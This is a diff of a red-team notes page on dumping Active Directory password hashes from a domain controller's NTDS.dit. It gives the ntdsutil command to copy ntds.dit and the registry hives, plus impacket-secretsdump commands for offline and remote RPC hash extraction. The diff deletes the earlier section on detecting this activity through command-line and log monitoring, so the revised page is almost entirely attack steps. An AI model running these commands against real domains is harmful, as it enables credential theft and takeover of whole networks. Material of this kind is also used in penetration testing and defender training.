@@ -1,52 +1,46 @@
 ---
-description: >-
-  Dumping and enumerating NTDS.dit - a file that contains information about
-  Active Directory users (hashes!).
+description: Dumping NTDS.dit with Active Directory users hashes
 ---
 
-# NTDS - Domain Controller
+# Dumping Domain Controller Hashes Locally and Remotely
 
-## Execution
+## No Credentials
 
-Dumping the required files using a native windows binary ntdsutil.exe to c:\temp:
+If you have no credentials, but you have access to the DC, it's possible to dump the ntds.dit using a lolbin ntdsutil.exe:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```bash
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 We can see that the ntds.dit and SYSTEM as well as SECURITY registry hives are being dumped to c:\temp:
 
 ![](../../.gitbook/assets/ntdsutil-attacker.png)
 
-We can then dump password hashes:
+We can then dump password hashes offline with impacket:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```bash
 root@~/tools/mitre/ntds# /usr/bin/impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/ntds-hashdump%20%281%29.png)
 
-## Observations
+## With Credentials
 
-On the victim machine, no susprises:
+If you have credentials for an account that can log on to the DC, it's possible to dump hashes from NTDS.dit remotely via RPC protocol with impacket:
 
-![](../../.gitbook/assets/ntdsutil-procexp.png)
+```text
+impacket-secretsdump -just-dc-ntlm offense/administrator@10.0.0.6
+```
 
-Monitoring commandline arguments is as usual a good idea as it can reveal attempts to dump ntds.dit:
-
-![](../../.gitbook/assets/ntdsutil-cmdline.png)
-
-Additionally, there are multiple Application logs that can indicate some activity around the ntds.dit which you may be interested in investigating further:
-
-![](../../.gitbook/assets/ntds-appllication-log.png)
+![](../../.gitbook/assets/image%20%2896%29.png)
 
 ## References
 
